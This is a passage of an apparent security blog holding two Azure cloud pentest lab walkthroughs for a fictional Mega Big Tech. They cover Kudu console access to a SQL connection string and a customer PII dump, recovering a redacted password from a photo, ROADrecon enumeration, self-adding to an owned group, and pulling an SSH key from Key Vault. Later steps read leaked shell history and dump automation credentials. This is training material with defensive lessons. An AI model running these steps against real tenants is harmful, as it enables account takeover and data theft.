terminal access to the app’s underlying operating system in a low-privilege Linux sandbox. If the web app connects to other Azure resources (e.g., Azure SQL, Storage Account, Key Vault), the user may access these in the context of the app’s permissions. We can go ahead an enumerate the web app further using the following cmdlet\nGet-AzWebApp -Name megabigtechdevapp23 | select enabledhostnames We are more concerned about the megabigtachdevapp23.scm.azurewebsites.net output. Notice the scm between the app’s name and the default azure domain azurewebsites.net .\nSCM stands for Source Control Manager, otherwise known as Kudu.\nNavigating to this domain gives us this web page as shown below :\nNext, click on Debug console \u0026gt; PowerShell .\nExploit Option 1 :\nWeb Apps often connect to backend resources using managed identities (a best practice). To verify this, check for environment variables like IDENTITY_ENDPOINT and IDENTITY_HEADER, which are required by managed identities. If these variables are present, you can request a token on behalf of the app to access its connected resources. For further details checkout this blog Exploit Option 2 :\nWeb Apps can also connect to resources using connection strings stored in environment variables (via App settings). You can list all environment variables with the env command. To find relevant variables, use grep to filter by keywords (e.g., connection string names or resource names). env | grep -i -e \u0026#34;DB\u0026#34; As shown in the above screenshot we got a connection string for an azure SQL instance at the well-known domain database.windows.net which provides us with the necessary credentials to connect to the database!\nIt is possible to enumerate useful software on this PowerShell session using the below cmdlet such as:\nMicrosoft SQL Server Command Line Utilities SQLCMD Microsoft SQL Server (along with any mention of \u0026ldquo;Tools\u0026rdquo; or \u0026ldquo;Utilities\u0026rdquo;) ODBC Driver for SQL Server (sometimes sqlcmd is installed alongside ODBC drivers) Get-ItemProperty -Path \u0026#34;HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34;, \u0026#34;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34;, \u0026#34;HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; |where { $_.DisplayName -ne $null } | Select-Object DisplayName, DisplayVersion, InstallDate We can therefore query the database and check for available tables.\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u0026lt;Username\u0026gt; -P \u0026lt;\u0026#39;Password\u0026#39;\u0026gt; -d \u0026lt;DB-NAME\u0026gt; -Q \u0026#34;SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = \u0026#39;BASE TABLE\u0026#39;\u0026#34; The CustomerData table was returned in output. Retrieving data from this table reveals PII (personally identifiable information) of Mega Big Tech customers :(\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u0026lt;Username\u0026gt; -P \u0026lt;\u0026#39;Password\u0026#39;\u0026gt; -d \u0026lt;DB-NAME\u0026gt; -Q \u0026#34;SELECT * FROM CustomerData\u0026#34; That\u0026rsquo;s all for today. For further reading, I recommend checking out PwnedLabs, which includes defensive strategies to mitigate these issues ⛇☃︎.\n","permalink":"http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/","summary":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough A possible password leak was found on pastebin\nWe need to determine if Mega Big Tech is using Azure Entra ID to manage their identities. The domain name megabigtech.com was given and it is possible check if a particular company is using Entra ID for authentication by browsing to the URL below.","title":"Azure Recon to Foothold and Profit"},{"content":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nOverview As part of our pre-engagement reconnaissance several Mega Big Tech employee profiles on LinkedIn were reviewed. One of their new employees, Matteus Lundgren posted recently about his new role and office space. This caught the eye as there appeared to be a Post-It note on the wall that had later been obfuscated. You are tasked with gaining initial access and demonstrating impact by increasing privileges.\nInitial Access and Privilege Escalation from Social Media Reconnaissance First of all we start by downloading the image this user posted on their social media from here The image says \u0026ldquo;#newoffice Rate.....\u0026rdquo; with a redacted text using a Markup\u0026rsquo;s pencil, which poses significant risk as shown in this forum However it is possible to use GIMP, An image manipulation program to retrieve the obscured text. Under the Colors drop down menu select Brightness-Contract.. and edit. We got the text SUMMERDAZE1! or maybe we can call it a password.\nThe next thing we need is this user actual username, We know they go by the name \u0026ldquo;Matteus Lundgren\u0026rdquo; but how is it saved on the domain ?.\nFor active directory On-Prem, I have found this tool to be useful as it creates a possible username from a given username and company name.\nHowever it is possible to guess this one as Mega Big Tech uses the below format :\n\u0026lt;firstname\u0026gt;@megabigtech.com `first.last@megabigtech.com With this format we can go ahead and try to login with a PS Session\naz login Which worked as shown in the below screenshot We can also confirm that we have successfully login with the below command PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az account show { \u0026#34;environmentName\u0026#34;: \u0026#34;AzureCloud\u0026#34;, \u0026#34;homeTenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34;, \u0026#34;isDefault\u0026#34;: true, \u0026#34;managedByTenants\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;Microsoft Azure Sponsorship\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;Enabled\u0026#34;, \u0026#34;tenantDefaultDomain\u0026#34;: \u0026#34;megabigtech.com\u0026#34;, \u0026#34;tenantDisplayName\u0026#34;: \u0026#34;Default Directory\u0026#34;, \u0026#34;tenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx\u0026#34;, \u0026#34;user\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;matteus@megabigtech.com\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;user\u0026#34; } } To understand the standpoint we are in, we can go ahead and list all resources that our current user has access to. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az resource list [ { \u0026#34;changedTime\u0026#34;: \u0026#34;2023-11-30T17:17:51.364990+00:00\u0026#34;, \u0026#34;createdTime\u0026#34;: \u0026#34;2023-11-30T17:07:03.686020+00:00\u0026#34;, \u0026#34;extendedLocation\u0026#34;: null, \u0026#34;id\u0026#34;: \u0026#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01\u0026#34;, \u0026#34;identity\u0026#34;: null, \u0026#34;kind\u0026#34;: null, \u0026#34;location\u0026#34;: \u0026#34;eastus\u0026#34;, \u0026#34;managedBy\u0026#34;: null, \u0026#34;name\u0026#34;: \u0026#34;AUTOMAT01\u0026#34;, \u0026#34;plan\u0026#34;: null, \u0026#34;properties\u0026#34;: null, \u0026#34;provisioningState\u0026#34;: \u0026#34;Succeeded\u0026#34;, \u0026#34;resourceGroup\u0026#34;: \u0026#34;mbt-rg-5\u0026#34;, \u0026#34;sku\u0026#34;: null, \u0026#34;tags\u0026#34;: null, \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Compute/virtualMachines\u0026#34;, \u0026#34;zones\u0026#34;: [ \u0026#34;1\u0026#34; ] } ] As show above we have access to a virtual machine named AUTOMAT01 in the mbt-rg-5 resource group.\nWe can therefore take a step further to retrieve general information about this virtual machine PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az vm show --resource-group mbt-rg-5 --name AUTOMAT01 { \u0026#34;additionalCapabilities\u0026#34;: { \u0026#34;hibernationEnabled\u0026#34;: false, \u0026#34;ultraSsdEnabled\u0026#34;: null }, \u0026#34;applicationProfile\u0026#34;: null, \u0026#34;availabilitySet\u0026#34;: null, \u0026#34;billingProfile\u0026#34;: null, \u0026#34;capacityReservation\u0026#34;: null, \u0026#34;diagnosticsProfile\u0026#34;: null, \u0026#34;evictionPolicy\u0026#34;: null, \u0026#34;extendedLocation\u0026#34;: null, \u0026#34;extensionsTimeBudget\u0026#34;: null, \u0026#34;hardwareProfile\u0026#34;: { \u0026#34;vmSize\u0026#34;: \u0026#34;Standard_B1ms\u0026#34;, \u0026#34;vmSizeProperties\u0026#34;: null }, \u0026#34;host\u0026#34;: null, \u0026#34;hostGroup\u0026#34;: null, \u0026#34;id\u0026#34;: \u0026#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/virtualMachines/AUTOMAT01\u0026#34;, \u0026#34;identity\u0026#34;: null, \u0026#34;instanceView\u0026#34;: null, \u0026#34;licenseType\u0026#34;: null, \u0026#34;location\u0026#34;: \u0026#34;eastus\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;AUTOMAT01\u0026#34;, \u0026#34;networkProfile\u0026#34;: { \u0026#34;networkApiVersion\u0026#34;: null, \u0026#34;networkInterfaceConfigurations\u0026#34;: null, \u0026#34;networkInterfaces\u0026#34;: [ { \u0026#34;deleteOption\u0026#34;: \u0026#34;Detach\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1\u0026#34;, \u0026#34;primary\u0026#34;: null, \u0026#34;resourceGroup\u0026#34;: \u0026#34;mbt-rg-5\u0026#34; } ] }, \u0026#34;osProfile\u0026#34;: { \u0026#34;adminPassword\u0026#34;: null, \u0026#34;adminUsername\u0026#34;: \u0026#34;automation\u0026#34;, \u0026#34;allowExtensionOperations\u0026#34;: true, \u0026#34;computerName\u0026#34;: \u0026#34;AUTOMAT01\u0026#34;, \u0026#34;customData\u0026#34;: null, \u0026#34;linuxConfiguration\u0026#34;: { \u0026#34;disablePasswordAuthentication\u0026#34;: true, \u0026#34;enableVmAgentPlatformUpdates\u0026#34;: false, \u0026#34;patchSettings\u0026#34;: { \u0026#34;assessmentMode\u0026#34;: \u0026#34;ImageDefault\u0026#34;, \u0026#34;automaticByPlatformSettings\u0026#34;: null, \u0026#34;patchMode\u0026#34;: \u0026#34;ImageDefault\u0026#34; }, \u0026#34;provisionVmAgent\u0026#34;: true, \u0026#34;ssh\u0026#34;: { \u0026#34;publicKeys\u0026#34;: [ { \u0026#34;keyData\u0026#34;: \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6mR2ZA1xLw4xONa+hQYoVGcmKMZtVU+WVQjREfDgHsDZSIjDrvXAPOQe9falxs3Wj14EjOzPyCtnq3teFrqUaUjiFohaZTdU5mKikVFhLyG8hHvTp1QEI9bBYOVSi2n3pUUKq16VgZwpPIWJscdRJcFiN03mhC1clZwu4T/p7lFFNlGW33SxNN7vaXA05lX2laF3UGTBjU5fzRJ4zzC1Nn5OEUwIyRKsGE6uy/rZxhr5qrjGpthL27KpssXKcg9tJgTBsMTwQWsBSLCjUjrJv1VCQKkGlY5UXRck24TdVSSYt7j/m6G702huC1DrDEtbjXSGWZ17MT1RRIqChsdUY2l3+g8TSPaHyrxkC4y6q8scUWVgrIcvUHqtAJhYmEyeRVtiJcKSerqKdwsyNuIUbflkc/l99n0Dr1cyj/LDRdxVzjSjWxKMRxPgWrZ/kQ9mC5PicXuLXlQTceiIlExT59UTaYFpHmpmnarE3yzCRdqHyMfdu3tmsTEp39vt+7i0= generated-by-azure\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/home/automation/.ssh/authorized_keys\u0026#34; } ] } }, \u0026#34;requireGuestProvisionSignal\u0026#34;: true, \u0026#34;secrets\u0026#34;: [], \u0026#34;windowsConfiguration\u0026#34;: null }, \u0026#34;plan\u0026#34;: null, \u0026#34;platformFaultDomain\u0026#34;: null, \u0026#34;priority\u0026#34;: null, \u0026#34;provisioningState\u0026#34;: \u0026#34;Succeeded\u0026#34;, \u0026#34;proximityPlacementGroup\u0026#34;: null, \u0026#34;resourceGroup\u0026#34;: \u0026#34;mbt-rg-5\u0026#34;, \u0026#34;resources\u0026#34;: null, \u0026#34;scheduledEventsProfile\u0026#34;: null, \u0026#34;securityProfile\u0026#34;: null, \u0026#34;storageProfile\u0026#34;: { \u0026#34;dataDisks\u0026#34;: [], \u0026#34;diskControllerType\u0026#34;: \u0026#34;SCSI\u0026#34;, \u0026#34;imageReference\u0026#34;: { \u0026#34;communityGalleryImageId\u0026#34;: null, \u0026#34;exactVersion\u0026#34;: \u0026#34;20.04.202310250\u0026#34;, \u0026#34;id\u0026#34;: null, \u0026#34;offer\u0026#34;: \u0026#34;0001-com-ubuntu-server-focal\u0026#34;, \u0026#34;publisher\u0026#34;: \u0026#34;canonical\u0026#34;, \u0026#34;sharedGalleryImageId\u0026#34;: null, \u0026#34;sku\u0026#34;: \u0026#34;20_04-lts-gen2\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;osDisk\u0026#34;: { \u0026#34;caching\u0026#34;: \u0026#34;ReadWrite\u0026#34;, \u0026#34;createOption\u0026#34;: \u0026#34;FromImage\u0026#34;, \u0026#34;deleteOption\u0026#34;: \u0026#34;Delete\u0026#34;, \u0026#34;diffDiskSettings\u0026#34;: null, \u0026#34;diskSizeGb\u0026#34;: 30, \u0026#34;encryptionSettings\u0026#34;: null, \u0026#34;image\u0026#34;: null, \u0026#34;managedDisk\u0026#34;: { \u0026#34;diskEncryptionSet\u0026#34;: null, \u0026#34;id\u0026#34;: \u0026#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Compute/disks/AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494\u0026#34;, \u0026#34;resourceGroup\u0026#34;: \u0026#34;mbt-rg-5\u0026#34;, \u0026#34;securityProfile\u0026#34;: null, \u0026#34;storageAccountType\u0026#34;: \u0026#34;Standard_LRS\u0026#34; }, \u0026#34;name\u0026#34;: \u0026#34;AUTOMAT01_OsDisk_1_367da2b6d9384da8ada2c2d49e5aa494\u0026#34;, \u0026#34;osType\u0026#34;: \u0026#34;Linux\u0026#34;, \u0026#34;vhd\u0026#34;: null, \u0026#34;writeAcceleratorEnabled\u0026#34;: null } }, \u0026#34;tags\u0026#34;: null, \u0026#34;timeCreated\u0026#34;: \u0026#34;2023-11-30T17:07:03.721328+00:00\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Compute/virtualMachines\u0026#34;, \u0026#34;userData\u0026#34;: null, \u0026#34;virtualMachineScaleSet\u0026#34;: null, \u0026#34;vmId\u0026#34;: \u0026#34;fc3e4e78-01a7-4cf2-a79c-1b897b6c951e\u0026#34;, \u0026#34;zones\u0026#34;: [ \u0026#34;1\u0026#34; ] } Here’s a breakdown of the vital information from the output of your above command:\nVM Name: AUTOMAT01\nResource Group: mbt-rg-5\nLocation: eastus\nVM Size: Standard_B1ms (Basic tier, 1 vCPU, 2 GiB RAM)\nOS Disk Size: 30 GB (Managed disk with Standard_LRS storage)\nOS Type: Linux (Ubuntu 20.04 LTS)\nAdmin Username: automation\nSSH Public Key: An SSH public key has been deployed for the user automation, located at /home/automation/.ssh/authorized_keys.\nVM State: Provisioning state is Succeeded (VM creation was successful).\nDisk Encryption: No disk encryption settings enabled.\nZone: The VM is located in availability zone 1.\nNetwork:\nThe VM is associated with a network interface /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1. According to the lab, since we have a public key for SSH, it is worth noting down an IP address for this Virtual Machine, However we have the following error\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv (AuthorizationFailed) The client \u0026#39;matteus@megabigtech.com\u0026#39; with object id \u0026#39;0dd32296-20f5-447c-b879-c57922db1ff0\u0026#39; does not have authorization to perform action \u0026#39;Microsoft.Network/networkInterfaces/read\u0026#39; over scope \u0026#39;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1\u0026#39; or the scope is invalid. If access was recently granted, please refresh your credentials. Code: AuthorizationFailed Message: The client \u0026#39;matteus@megabigtech.com\u0026#39; with object id \u0026#39;0dd32296-20f5-447c-b879-c57922db1ff0\u0026#39; does not have authorization to perform action \u0026#39;Microsoft.Network/networkInterfaces/read\u0026#39; over scope \u0026#39;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1\u0026#39; or the scope is invalid. If access was recently granted, please refresh your credentials. ROADrecon For Structured Enumeration To better get familiar with this environment we can use the ROADrecon tool from the (Rogue Office 365 and Azure (active) Directory tools) framework to interact better with Entra-ID\n❯ pip install roadrecon Then authenticate to the utility to acquire tokens for our owned user.\n❯ roadrecon auth -u matteus@megabigtech.com -p SUMMERDAZE1! Tokens were written to .roadtools_auth Then execute the below command to collect all Azure information that the user has permission to see.\n❯ roadrecon gather Starting data gathering phase 1 of 2 (collecting objects) Starting data gathering phase 2 of 2 (collecting properties and relationships) ROADrecon gather executed in 107.38 seconds and issued 1843 HTTP requests. Finally start the ROADrecon GUI web server with so we can visually examine the Azure environment.\n❯ roadrecon gui * Serving Flask app \u0026#39;roadtools.roadrecon.server\u0026#39; * Debug mode: off WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:5000 Press CTRL+C to quit If Bloodhoundis available we can also transfer the collected data to the corresponding Neo4j instance.\n❯ roadrecon plugin bloodhound --neodatabase localhost -du neo4j -dp neo4j1 Connecting to neo4j Running queries Done! Navigating to the Users tab and searching for our present user Matt..., We can view the overview of this user. As shown below we have the ObjectID and Role Memeberships they have been assigned to.\nChecking the Owned objects tab we see that our current user is the owner of the DEVICE-ADMINS group! This group allows desktop support to access resources and could help us in our goal to move laterally and vertically within the environment.\nClicking the Raw tab we see the ObjectID of the group is shown as aff1bca2-0c41-44e9-8e2c-8d6ca50fec45 .\nReturn to the Owned objects tab and click on this group, we can see the group overview below.\nCurrently there are no members, but we can add ourselves to this group using the PowerShell Az module, since we are the owner.\nConnect-AzAccount Add-AzADGroupMember -TargetGroupObjectId aff1bca2-0c41-44e9-8e2c-8d6ca50fec45 -MemberObjectId 0dd32296-20f5-447c-b879-c57922db1ff0 After running this command we will need to refresh our session in order for any permissions associated with this group to take effect.\nDisconnect-AzAccount az logout Connect-AzAccount az login Then running the below command we can check out the updated Azure role assignments.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzRoleAssignment The most important output as shown in the above screenshots are the :\nScope : This shows which resources the user has permissions over. DisplayName : shows the user or group assigned the role. (Remember we already belong to the DEVICE-ADMINS so we have permissions this group has too) RoleDefinitionName : shows the specific role (and associated permissions) assigned. So in summary the ;\nMatteus Lundgren has been assigned the Reader role, limited to the virtual machine AUTOMAT01 within the mbt-rg-5 resource group, allowing him read-only access to that VM.\nFor the DEVICE-ADMINS Group:\nThey have access to resources in mbt-rg-5, including: Key Vault (Devices-new): The group can manage sensitive data like passwords or encryption keys stored in this Key Vault. Network Interface and Public IP for AUTOMAT01: The group can view network-related details for this VM. This setup controls what resources each entity can interact with in a specific resource group.\nInitial Access to the AUTOMAT01 VM We can go ahead and enumerate the Key Vault! and as shown below a secret resource named AUTOMAT01 is discovered which is stored in ASCII format.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az keyvault secret list --vault-name Devices-new [ { \u0026#34;attributes\u0026#34;: { \u0026#34;created\u0026#34;: \u0026#34;2023-12-01T22:26:11+00:00\u0026#34;, \u0026#34;enabled\u0026#34;: true, \u0026#34;expires\u0026#34;: null, \u0026#34;notBefore\u0026#34;: null, \u0026#34;recoverableDays\u0026#34;: 90, \u0026#34;recoveryLevel\u0026#34;: \u0026#34;Recoverable+Purgeable\u0026#34;, \u0026#34;updated\u0026#34;: \u0026#34;2023-12-01T22:26:11+00:00\u0026#34; }, \u0026#34;contentType\u0026#34;: null, \u0026#34;id\u0026#34;: \u0026#34;https://devices-new.vault.azure.net/secrets/AUTOMAT01\u0026#34;, \u0026#34;managed\u0026#34;: null, \u0026#34;name\u0026#34;: \u0026#34;AUTOMAT01\u0026#34;, \u0026#34;tags\u0026#34;: { \u0026#34;file-encoding\u0026#34;: \u0026#34;ascii\u0026#34; } } ] We can then use the az keyvault secret show command to read the secret in this resource and as shown below we have an SSH key.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az keyvault secret show --vault-name Devices-new --name AUTOMAT01 { \u0026#34;attributes\u0026#34;: { \u0026#34;created\u0026#34;: \u0026#34;2023-12-01T22:26:11+00:00\u0026#34;, \u0026#34;enabled\u0026#34;: true, \u0026#34;expires\u0026#34;: null, \u0026#34;notBefore\u0026#34;: null, \u0026#34;recoverableDays\u0026#34;: 90, \u0026#34;recoveryLevel\u0026#34;: \u0026#34;Recoverable+Purgeable\u0026#34;, \u0026#34;updated\u0026#34;: \u0026#34;2023-12-01T22:26:11+00:00\u0026#34; }, \u0026#34;contentType\u0026#34;: null, \u0026#34;id\u0026#34;: \u0026#34;https://devices-new.vault.azure.net/secrets/AUTOMAT01/80776fe595c64551a061e38de06eedab\u0026#34;, \u0026#34;kid\u0026#34;: null, \u0026#34;managed\u0026#34;: null, \u0026#34;name\u0026#34;: \u0026#34;AUTOMAT01\u0026#34;, \u0026#34;tags\u0026#34;: { \u0026#34;file-encoding\u0026#34;: \u0026#34;ascii\u0026#34; }, \u0026#34;value\u0026#34;: \u0026#34;-----BEGIN RSA PRIVATE KEY-----\\nMIIG4gIBAAKCAYEAupkdmQNcS8OMTjWvoUGKFRnJijGbVVPllUI0RHw4B7A2UiIw\\n671wDzkHvX2pcbN1o9eBIzsz8grZ6t7Xha6lGlI4haIWmU3VOZiopFRYS8hvIR70\\n6dUBCPWwWDlUotp96VFCqtelYGcKTyFibHHUSXBYjdN5oQtXJWcLuE/6e5RRTZRl\\nt90sTTe72lwNOZV9pWhd1BkwY1OX80SeM8wtTZ+ThFMCMkSrBhOrsv62cYa+aq4x--SNIP--\\n-----END RSA PRIVATE KEY-----\\n\u0026#34; } It is also possible to download this SSH secret key on our machine without removing the \\n terminator.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az keyvault secret download --vault-name Devices-new --name AUTOMAT01 --file AUTOMAT01.pem Since we have permission over the virtual machine AUTOMAT01 in the resource group mbt-rg-5, as shown when enumerating the role assignments in the below screenshot previously, we can go ahead and get the IP address of this VM.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv 13.68.147.240 Then we can grant rw permissions to the SSH private key and connect via SSH. If you are wondering how we got the username then refer to the top of this write-up during the enumeration of the VM phase\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; chmod 600 ./AUTOMAT01.pem PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; ssh -i AUTOMAT01.pem automation@13.68.147.240 The authenticity of host \u0026#39;13.68.147.240 (13.68.147.240)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:6GhdVGDYwkrfNkqprJC3ybwWOrbNuHwE7OxvJVvpWFo. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;13.68.147.240\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1052-azure x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Oct 16 09:09:14 UTC 2024 System load: 0.0 Processes: 103 Usage of /: 12.1% of 28.89GB Users logged in: 0 Memory usage: 18% IPv4 address for eth0: 10.1.0.4 Swap usage: 0% --SNIP-- automation@AUTOMAT01:~$ whoami automation automation@AUTOMAT01:~$ hostnamectl Static hostname: AUTOMAT01 Icon name: computer-vm Chassis: vm Machine ID: 5ce911bbc50f4dc7876fbed23e106dd8 Boot ID: 4ed5ef75483e407999f463f8d4a7f9eb Virtualization: microsoft Operating System: Ubuntu 20.04.6 LTS Kernel: Linux 5.15.0-1052-azure Architecture: x86-64s Post Exploitation It is worth doing some laying off the land enumeration, finding sensitive files/ hardcoded credentials; And as shown below we have another user credential in the .bash_history file of the user automation home directory.\naz login -u \u0026#34;serene@megabigtech.com\u0026#34; -p \u0026#34;xxxxxxxxxxx\u0026#34; Accessing Automation Account and Exporting Runbook in Azure We can therefore go ahead back to our powershell session and connect to the new Azure account we just got!\nDisconnect-AzAccount az logout Connect-AzAccount az login Then Access to an Automation Account named automation-dev and a Runbook named Schedule-VMStartStop was enumerated using Get-AzResource. or the az resource list command as used previously.\nAzure Automation Accounts enable task automation using PowerShell or Python scripts for managing enterprise resources and workloads, streamlining deployment, operations, and decommissioning processes.\nRunbooks are scripts within Automation Accounts that automate tasks, ensuring consistent management of resources at scale and minimizing manual intervention.\nWe can use the Get-AzAutomationAccount cmdlet to retrieve key details about the Automation Account, confirming whether public access is enabled or not.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzAutomationAccount -ResourceGroupName \u0026#34;mbt-rg-5\u0026#34; -Name \u0026#34;automation-dev\u0026#34; SubscriptionId : ceff06cb-e29d-4486-a3ae-eaaec5689f94 ResourceGroupName : mbt-rg-5 AutomationAccountName : automation-dev Location : eastus State : Ok Plan : Basic CreationTime : 12/1/2023 2:21:55PM +01:00 LastModifiedTime : 12/1/2023 2:21:55PM +01:00 LastModifiedBy : Tags : {} Identity : Encryption : Microsoft.Azure.Management.Automation.Models.EncryptionProperties PublicNetworkAccess : True Since we have PublicNetworkAccess set to True we can export the Runbook with Export-AzAutomationRunbook.\nExport-AzAutomationRunbook -ResourceGroupName \u0026#34;mbt-rg-5\u0026#34; -AutomationAccountName \u0026#34;automation-dev\u0026#34; -Name Schedule-VMStartStop -Output . As shown below this file doesn\u0026rsquo;t contain any hardcoded credentials or sensitive information that would be useful from an attacker scenario.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; file Schedule-VMStartStop.ps1 Schedule-VMStartStop.ps1: ASCII text, with CRLF line terminators PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; cat Schedule-VMStartStop.ps1 param ( [Parameter(Mandatory=$true)] [string] $Action # Should be either \u0026#39;Start\u0026#39; or \u0026#39;Stop\u0026#39; ) # Authenticate with Azure $Conn = Get-AutomationConnection -Name AzureRunAsConnection Connect-AzAccount -ServicePrincipal -TenantId $Conn.TenantId -ApplicationId $Conn.ApplicationId -CertificateThumbprint $Conn.CertificateThumbprint # Fetch VMs based on tags $VMsToProcess = Get-AzVM | Where-Object { ($_.Tags[\u0026#34;AutoStart\u0026#34;] -eq \u0026#34;True\u0026#34; -and $Action -eq \u0026#34;Start\u0026#34;) -or ($_.Tags[\u0026#34;AutoStop\u0026#34;] -eq \u0026#34;True\u0026#34; -and $Action -eq \u0026#34;Stop\u0026#34;) } foreach ($VM in $VMsToProcess) { if ($Action -eq \u0026#34;Start\u0026#34;) { # Start the VM Start-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -ErrorAction Continue } elseif ($Action -eq \u0026#34;Stop\u0026#34;) { # Stop the VM Stop-AzVM -Name $VM.Name -ResourceGroupName $VM.ResourceGroupName -Force -ErrorAction Continue } else { Write-Output \u0026#34;Invalid Action Specified\u0026#34; } } Write-Output \u0026#34;Processed all VMs for action: $Action\u0026#34; Credential Security in Automation Accounts It\u0026rsquo;s also important to check for credentials configured in the automation account because automation tasks often require authentication to interact with various resources. While the actual password is not directly accessible, the credentials are still available for use within Runbooks to perform tasks that require authentication, such as managing resources or executing scripts. This ensures that the automation can securely access necessary resources without manual intervention.\nGet-AzAutomationCredential -ResourceGroupName \u0026#34;mbt-rg-5\u0026#34; -AutomationAccountName \u0026#34;automation-dev\u0026#34; | Format-Table Name, CreationTime, Description We can check if we have write access to the automation-dev automation account using the Get-AzRoleAssignment command.\nAs shown above we only have the Reader role meaning we can\u0026rsquo;t edit the Runbook, if we could, we would append the following PowerShell to the script and see the credentials in the job output.\n$cred = Get-AutomationPSCredential -Name automate-default $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password If you are still interested in knowing how to edit the Runbook regardless of the missing permissions then refer to my alternate blog, Link Here.\nIdentifying Unencrypted Variables Azure Automation supports variable assets, which are globally accessible variables for Runbooks. Sensitive variables like keys and passwords should be encrypted for security. However, in this instance, it appears that a sensitive variable was stored unencrypted, posing a security risk. This oversight could potentially grant unauthorized access to critical information, highlighting the importance of proper security practices in automation accounts.\nGet-AzAutomationVariable -ResourceGroupName \u0026#34;mbt-rg-5\u0026#34; -AutomationAccountName \u0026#34;automation-dev\u0026#34; | fl Name, Value, Description As shown above we have the flag value and a Global administrator credential, haha ᯓ★.\nSummary X Defense Employees often unintentionally expose sensitive information on social media, which red teams can exploit for phishing and password creation. In one case, an employee believed they had redacted sensitive data using iOS Markup, but it was recoverable due to transparency issues. Additionally, we exploited an exposed password in the .bash_history file, highlighting the risks of passing passwords via command lines, which can be logged in history files and Windows event logs, however to authenticate without a browser, we used az login --use-device-code to force device code authentication for more security. Finally, we obtained global admin credentials due to insecure secret storage, emphasizing the importance of saving sensitive data as encrypted variables, which are not encrypted by default.\nResources Lab Link : https://pwnedlabs.io/labs/unmask-privileged-access-in-azure https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0 https://medium.com/@mgbecken/roadtools-1e9dabc2c8e9 